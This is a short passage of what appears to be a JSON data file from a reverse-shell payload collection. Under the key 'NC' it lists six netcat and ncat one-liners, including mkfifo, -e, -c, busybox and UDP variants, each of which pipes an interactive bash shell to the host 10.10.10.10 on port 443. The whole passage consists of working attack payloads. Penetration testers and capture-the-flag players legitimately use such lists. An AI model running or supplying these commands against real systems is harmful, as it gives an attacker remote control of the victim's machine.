    "NC":{
        "nc mkfifo":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.10.10 443 >/tmp/f",
        "nc -e":"nc 10.10.10.10 443 -e bash",
        "nc busybox":"busybox nc 10.10.10.10 443 -e bash",
        "nc -c":"nc -c bash 10.10.10.10 443",
        "ncat -e":"ncat 10.10.10.10 443 -e bash",
        "ncat udp":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|ncat -u 10.10.10.10 443 >/tmp/f"
